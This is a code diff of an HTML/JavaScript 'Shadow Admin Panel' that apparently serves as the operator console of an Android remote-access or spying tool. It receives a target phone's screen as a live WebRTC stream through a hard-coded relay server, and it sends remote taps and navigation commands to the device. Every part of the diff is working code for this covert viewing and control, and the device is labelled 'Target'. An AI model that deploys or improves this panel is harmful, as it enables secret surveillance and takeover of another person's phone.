@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shadow Admin Panel</title>
+    <title>Shadow Admin Panel - Live Stream</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
@@ -39,13 +39,20 @@
 
         /* --- Phone Frame --- */
         .phone-frame {
-            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
+            width: 320px; height: 640px; border: 8px solid #222; border-radius: 30px;
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-        #screenStream { width: 100%; height: 100%; object-fit: contain; }
         
-        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
+        /* 🔥 VIDEO PLAYER (WebRTC) 🔥 */
+        #remoteVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: contain; /* Pura screen dikhega bina kate */
+            background-color: #000;
+        }
+        
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; pointer-events: none; }
 
         /* --- Controls --- */
         .side-panel {
@@ -80,17 +87,18 @@
         <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">Initializing...</span>
+            <span id="statusText" style="color:#888">Waiting for connection...</span>
         </div>
     </div>
 
     <div class="screen-container">
         <div class="phone-frame">
             <div id="offlineMsg" class="offline-msg">
-                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
-                <p style="margin-top:10px" id="msgText">Connecting...</p>
+                <i class="fa-solid fa-video-slash fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Waiting for Stream...</p>
             </div>
-            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
+            
+            <video id="remoteVideo" autoplay playsinline muted></video>
             
             <div class="nav-bar">
                 <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
@@ -111,76 +119,107 @@
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com"; 
-        let socket = null; // Defined explicitly
+        let socket = null;
         let currentDeviceId = null;
+        let peerConnection;
+        
+        // Google ke Free STUN Servers (Video connection establish karne ke liye)
+        const rtcConfig = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' }
+            ]
+        };
 
-        // 1. Start logic ONLY when page is ready
+        const remoteVideo = document.getElementById('remoteVideo');
+
         window.addEventListener('load', function() {
             const urlParams = new URLSearchParams(window.location.search);
-            currentDeviceId = urlParams.get('id');
+            currentDeviceId = urlParams.get('id'); // URL se ID uthao (?id=123456)
 
             if (currentDeviceId) {
                 document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
-                startConnection(); // Call connection logic
+                startConnection();
             } else {
-                document.getElementById('statusText').innerText = "No ID Found";
-                document.getElementById('msgText').innerText = "Error: Invalid Link";
-                document.getElementById('statusText').style.color = "var(--danger)";
+                document.getElementById('statusText').innerText = "No Device ID";
+                document.getElementById('msgText').innerText = "Link me ID nahi hai";
             }
         });
 
         function startConnection() {
-            // Check if IO library is loaded
-            if (typeof io === 'undefined') {
-                alert("Error: Socket.io library failed to load. Check internet.");
-                return;
-            }
-
-            // Initialize Socket
             socket = io(SERVER_URL, { 
-                transports: ['websocket', 'polling'], // Fallback options added
+                transports: ['websocket'], 
                 reconnection: true
             });
 
-            // 2. Event Listeners Setup
             socket.on("connect", () => {
-                console.log("Web Connected!");
-                document.getElementById('statusText').innerText = "Online: " + currentDeviceId;
+                console.log("Web Connected to Server");
+                document.getElementById('statusText').innerText = "Connected to Server";
                 document.getElementById('statusText').style.color = "var(--accent)";
                 document.getElementById('dot').classList.add("active");
                 
-                // IMPORTANT FIX: Join the SPECIFIC Device Room, not 'admin_monitor'
-                console.log("Joining Room: " + currentDeviceId);
-                socket.emit("join", currentDeviceId); 
+                // Join Room as Viewer
+                socket.emit("join-room", currentDeviceId);
+            });
+
+            // 🔥 1. Wait for OFFER from Android
+            socket.on("offer", async (offer) => {
+                console.log("Received Offer from Android");
+                document.getElementById('offlineMsg').style.display = "none";
+
+                if (peerConnection) peerConnection.close();
+                peerConnection = new RTCPeerConnection(rtcConfig);
+
+                // Jab Android se stream aaye, video me dikhao
+                peerConnection.ontrack = (event) => {
+                    console.log("Stream received!");
+                    remoteVideo.srcObject = event.streams[0];
+                };
+
+                // ICE Candidates bhejo wapis Android ko
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        socket.emit("candidate", {
+                            target: currentDeviceId,
+                            candidate: event.candidate
+                        });
+                    }
+                };
+
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                
+                // Answer create karo aur Android ko bhejo
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+                
+                socket.emit("answer", {
+                    target: currentDeviceId,
+                    answer: answer
+                });
+            });
+
+            // 🔥 2. Handle Candidates from Android
+            socket.on("candidate", async (candidate) => {
+                if (peerConnection) {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+                    } catch (e) {
+                        console.error("Error adding candidate", e);
+                    }
+                }
             });
 
             socket.on("disconnect", () => {
                 console.log("Disconnected");
                 document.getElementById('statusText').innerText = "Offline";
-                document.getElementById('statusText').style.color = "var(--danger)";
                 document.getElementById('dot').classList.remove("active");
                 document.getElementById('offlineMsg').style.display = "flex";
-                document.getElementById('msgText').innerText = "Server Disconnected";
-            });
-
-            // 3. Receive Image
-            socket.on("screen-data", (data) => {
-                // Since we joined the specific room, all data receiving here is for us
-                console.log("Image Recieved!"); // Debug log
-                document.getElementById('offlineMsg').style.display = "none";
-                document.getElementById('screenStream').src = "data:image/jpeg;base64," + data.image;
-            });
-
-            socket.on("connect_error", (err) => {
-                console.error("Connection Error:", err);
             });
         }
 
+        // --- BUTTON COMMANDS (Same as before) ---
         function sendCommand(action) {
-            if(!socket || !currentDeviceId) {
-                console.warn("Socket not connected or No ID");
-                return;
-            }
+            if(!socket || !currentDeviceId) return;
             navigator.vibrate(50);
             
             socket.emit("control-event", {
@@ -190,23 +229,23 @@
             });
         }
 
-        function sendClick(event) {
+        // Click Handling (Optional: Agar video pe click bhejna ho)
+        remoteVideo.addEventListener('click', (event) => {
             if(!socket || !currentDeviceId) return;
-            
-            const img = document.getElementById('screenStream');
-            const rect = img.getBoundingClientRect();
-            
+            const rect = remoteVideo.getBoundingClientRect();
+            // Calculate scale agar video actual size se alag hai
             const x = Math.round(event.clientX - rect.left);
             const y = Math.round(event.clientY - rect.top);
-
+            
+            // NOTE: Video scale factor logic yahan add karna padega agar coordinates match nahi ho rahe
+            
             socket.emit("control-event", {
                 room: currentDeviceId,
                 action: "click",
-                x: x,
-                y: y
+                x: x, y: y
             });
-        }
+        });
+
     </script>
 </body>
 </html>
-
